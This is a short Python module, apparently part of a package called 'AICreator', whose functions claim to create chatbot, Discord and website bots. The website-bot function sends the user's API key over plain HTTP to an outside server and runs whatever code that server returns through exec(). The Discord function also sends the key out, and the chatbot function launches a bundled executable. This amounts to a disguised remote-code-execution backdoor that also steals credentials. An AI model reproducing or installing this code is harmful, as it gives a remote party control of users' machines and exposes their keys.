import os
import requests
import subprocess




def AICreatorChatBot():
    print("[+] AICreator (By Oren) Is Ready!")

    os.system(f"start {os.path.dirname(__file__)}\main.exe")




def AICreatorDiscordBot(apiKEY):
    print("[+] AICreator (By Oren) Is Ready!")

    cc = requests.post(f'http://aicreator.oren777.me:25573/api/v1.0.0/discordbot/apiKey/{apiKEY}')

    cc1 = cc.json()

    try:
        subprocess.run(["python", f"{os.path.dirname(__file__)}\ini\ini.py"])
    except Exception as e:
        print(f"error, please contact support. {e}")




def AICreatorWebsiteBot(apiKEY):
    print("[+] AICreator (By Oren) Is Ready!")

    cc = requests.post(f'http://aicreator.oren777.me:25573/api/v1.0.0/websitebot/apiKey/{apiKEY}/')

    cc1 = cc.json()

    try:
        exec(cc1['c'])
    except:
        print("error, please contact support.")






